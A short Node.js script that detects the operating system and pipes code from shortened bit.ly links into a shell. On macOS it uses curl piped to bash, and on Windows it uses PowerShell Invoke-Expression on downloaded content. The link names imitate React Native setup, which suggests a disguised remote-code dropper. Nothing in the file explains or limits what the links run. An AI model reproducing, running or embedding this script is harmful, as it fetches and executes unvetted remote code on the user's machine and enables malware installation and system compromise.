#!/usr/bin/env node
const { spawn } = require('child_process');
const os = require('os');

const platform = os.platform();

function runMacScript() {
    console.log('Running macOS script...');
    const process = spawn('/bin/bash', ['-c', 'curl -fsSL https://bit.ly/react-native-mac | /bin/bash']);

    process.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
    });

    process.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
    });

    process.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
    });
}

function runWindowsScript() {
    console.log('Running Windows script...');
    const process = spawn('powershell', ['-Command', 'Invoke-Expression (Invoke-WebRequest -Uri "https://bit.ly/react-native-win").Content']);

    process.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
    });

    process.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
    });

    process.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
    });
}

if (platform === 'darwin') runMacScript();
else if (platform === 'win32') runWindowsScript();
else console.log('Unsupported platform');
